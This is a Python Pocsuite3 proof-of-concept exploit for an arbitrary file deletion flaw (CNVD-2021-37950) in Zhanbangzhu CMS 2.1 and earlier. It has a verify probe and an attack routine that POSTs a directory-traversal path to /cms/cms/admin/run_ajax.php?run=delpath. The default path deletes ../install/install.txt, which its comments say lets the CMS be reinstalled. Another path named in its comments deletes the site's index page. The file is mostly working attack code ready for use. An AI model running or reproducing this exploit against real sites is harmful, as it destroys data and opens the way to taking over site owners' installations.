from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin

class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = 'midi'  # PoC 的作者
    vulDate = '2021-7-02'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2022-1-16'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2022-1-16'  # PoC 更新日期 (%Y-%m-%d)
    references = ['https://www.cnvd.org.cn/flaw/show/CNVD-2021-37950']  # 漏洞来源地址，0day 不用写
    name = '南宁比优网络科技有限公司 站帮主CMS 2.1 任意文件删除'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'http://www.zbzcms.com'  # 漏洞厂商主页地址
    appName = '站帮主'  # 漏洞应用名称
    appVersion = '<=2.1'  # 漏洞影响版本
    vulType = 'Arbitrary File Deletion'  # 漏洞类型，参见漏洞类型规范表
    desc = '/cms/cms/admin/run_ajax.php接口的path参数存在任意文件删除'  # 漏洞简要描述
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = '''任意文件删除可导致该cms重装 删除内容： ../install/install.txt '''

    def _options(self):
        o = OrderedDict()
        o["path"] = OptString('../install/install.txt', description='../../../index.php 为根目录首页, 攻击时自定义路径')
        return o

    def _verify(self):
        result = {}
        # payload = "path={0}".format(self.get_option("username"))
        payload2 = "/cms/cms/admin/run_ajax.php?run=delpath"
        resp = requests.get(self.url+payload2)
        if resp and resp.status_code == 200 and "严禁该操作" in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Referer'] = payload2

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        path = self.get_option("path")
        result = dict()
        result['Stdout'] = self._exploit(path)
        return self.parse_output(result)

    def _exploit(self, path='../install/install.txt'):
        url = urljoin(self.url, '/cms/cms/admin/run_ajax.php?run=delpath')
        data_post = {
            "path": path
        }
        resp1 = requests.post(url, data=data_post)
        print(url)
        print(data_post)
        if resp1 and resp1.status_code == 200:
            return path+"删除成功"


register_poc(DemoPOC)